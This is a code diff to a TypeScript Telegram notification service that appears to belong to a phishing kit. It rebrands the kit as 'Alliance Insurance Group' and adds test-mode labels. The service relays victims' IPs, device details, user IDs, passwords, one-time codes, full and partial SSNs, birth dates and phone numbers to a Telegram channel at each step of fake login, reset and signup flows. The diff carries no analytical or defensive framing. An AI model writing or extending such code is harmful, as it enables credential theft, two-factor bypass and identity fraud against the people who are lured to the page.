@@ -1,4 +1,6 @@
-const SITE_NAME = "Flores";
+import { isProduction } from "./utils";
+
+const SITE_NAME = "Alliance Insurance Group";
 
 export interface VisitorData {
   location: string;
@@ -124,7 +126,7 @@ class TelegramService {
         ? rawReferrer
         : "Direct / no referrer (typed URL, bookmark, or referrer stripped by browser)";
 
-    const message = `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}\n\n📱 <b>Device:</b> ${data.userAgent}\n🖥️ <b>Screen:</b> ${data.screen}\n🌍 <b>Language:</b> ${data.language}\n\n🔗 <b>Page URL:</b> ${pageUrl}\n↩️ <b>Referrer (source):</b> ${referrer}\n\n🕒 <b>UTC Time:</b> ${data.utcTime}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${ipDisplay}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}\n\n📱 <b>Device:</b> ${data.userAgent}\n🖥️ <b>Screen:</b> ${data.screen}\n🌍 <b>Language:</b> ${data.language}\n\n🔗 <b>Page URL:</b> ${pageUrl}\n↩️ <b>Referrer (source):</b> ${referrer}\n\n🕒 <b>UTC Time:</b> ${data.utcTime}`;
     await this.sendMessage(message);
   }
 
@@ -135,7 +137,7 @@ class TelegramService {
         : "Unknown";
 
     const message =
-      `\n🤖 <b>BOT</b>\n\n` +
+      `\n${isProduction ? "" : "[TEST]"} \n🤖 <b>BOT</b>\n\n` +
       `🧩 <b>Name:</b> ${data.name}\n` +
       `📝 <b>Type:</b> ${data.type}\n\n` +
       `🤖 <b>User-Agent:</b>\n${data.userAgent}\n\n` +
@@ -147,12 +149,12 @@ class TelegramService {
   }
 
   async sendLoginNotification(data: LoginData): Promise<void> {
-    const message = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
     await this.sendMessage(message);
   }
 
   async sendVerificationNotification(data: VerificationData): Promise<void> {
-    const message = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
     await this.sendMessage(message);
   }
 
@@ -160,7 +162,7 @@ class TelegramService {
     verificationType: string,
     ip?: string,
   ): Promise<void> {
-    const message = `\n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
     await this.sendMessage(message);
   }
 
@@ -169,44 +171,44 @@ class TelegramService {
     ip?: string,
   ): Promise<void> {
     const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)";
-    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`;
     await this.sendMessage(message);
   }
 
   async sendForgotPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`;
     await this.sendMessage(message);
   }
 
   async sendForgotPasswordNotification(
     data: ForgotPasswordData,
   ): Promise<void> {
-    const message = `\n🔑 <b>Forgot Password – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔑 <b>Forgot Password – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
     await this.sendMessage(message);
   }
 
   async sendNewUserPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`;
     await this.sendMessage(message);
   }
 
   async sendNewUserNotification(data: NewUserData): Promise<void> {
-    const message = `\n👤 <b>New User – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n👤 <b>New User – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
     await this.sendMessage(message);
   }
 
   async sendNewUserCodePageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`;
     await this.sendMessage(message);
   }
 
   async sendNewUserCodeNotification(code: string, ip?: string): Promise<void> {
-    const message = `\n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
     await this.sendMessage(message);
   }
 
   async sendNewUserPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`;
     await this.sendMessage(message);
   }
 
@@ -214,7 +216,7 @@ class TelegramService {
     password: string,
     ip?: string,
   ): Promise<void> {
-    const message = `\n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`;
     await this.sendMessage(message);
   }
 
@@ -222,13 +224,13 @@ class TelegramService {
     const passwordText = data.password
       ? `\n🔑 <b>Password:</b> ${data.password}`
       : "";
-    const message = `\n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`;
     await this.sendMessage(message);
   }
 
   async sendAccountFoundResetPasswordNotification(ip?: string): Promise<void> {
     const message =
-      `\n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
+      `\n${isProduction ? "" : "[TEST]"} \n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
       `User clicked "Reset password" on the account found page.`;
     await this.sendMessage(message);
   }
@@ -237,7 +239,7 @@ class TelegramService {
     verificationType: string,
     ip?: string,
   ): Promise<void> {
-    const message = `\n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
     await this.sendMessage(message);
   }
 
@@ -245,25 +247,25 @@ class TelegramService {
     code: string,
     ip?: string,
   ): Promise<void> {
-    const message = `\n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
     await this.sendMessage(message);
   }
 
   async sendForgotPasswordResendNotification(ip?: string): Promise<void> {
-    const message = `\n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`;
     await this.sendMessage(message);
   }
 
   async sendRememberDeviceNotification(
     data: RememberDeviceData,
   ): Promise<void> {
-    const message = `\n💾 <b>Remember Device Choice - ${SITE_NAME}</b>\n\n📱 <b>Choice:</b> ${data.choice}`;
+    const message = `\n${isProduction ? "" : "[TEST]"} \n💾 <b>Remember Device Choice - ${SITE_NAME}</b>\n\n📱 <b>Choice:</b> ${data.choice}`;
     await this.sendMessage(message);
   }
 
   async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
     const message =
-      `\n📝 <b>Verify Details – form submitted - ${SITE_NAME}</b>\n\n` +
+      `\n${isProduction ? "" : "[TEST]"} \n📝 <b>Verify Details – form submitted - ${SITE_NAME}</b>\n\n` +
       `🔢 <b>SSN:</b> ${data.ssn}\n` +
       `📅 <b>Birth Date:</b> ${data.birthDate}\n` +
       `📞 <b>Phone:</b> ${data.phone}\n` +
